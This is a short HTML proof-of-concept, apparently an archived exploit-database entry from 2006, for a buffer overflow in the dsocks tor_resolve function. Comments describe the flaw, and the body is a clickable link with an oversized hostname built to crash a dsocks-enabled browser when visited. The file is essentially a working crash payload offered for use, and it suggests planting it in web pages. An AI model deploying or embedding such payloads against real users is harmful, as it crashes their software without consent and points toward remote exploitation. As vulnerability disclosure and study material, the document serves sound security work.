@@ -1,0 +1,34 @@
+<!--
+dsock <= 1.3 (buf) Remote Buffer Overflow PoC
+
+Original Author:
+Michael Adams <parasite [a] sdf.lonestar.org>
+
+A buffer overflow in variable 'buf' exists due to insufficient validation
+of variable 'name' in function tor_resolve line 218 of software at
+http://www.monkey.org/~dugsong/dsocks/
+
+url PoC: DaveK
+
+At a quick glance, this looks like it could indeed be overflowed quite
+trivially by passing an overlong name to any of the host lookup functions
+proxied by dsocks.  It therefore seems that it could quite easily be
+triggered remotely by, for example, a web page with an include/iframe using
+an overlong URL.
+
+ I would advise anyone currently using dsocks to click here:
+
+ -->
+ 
+<a href="http://foo.12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaveryverylongname.com.invalid/">Click Me For A Test Crash</a>
+
+<!--
+
+and if they crash their dsocks-enabled web-browser, to stop using it very
+quickly indeed.
+
+   cheers,
+     DaveK
+-->
+
+# milw0rm.com [2006-09-05]
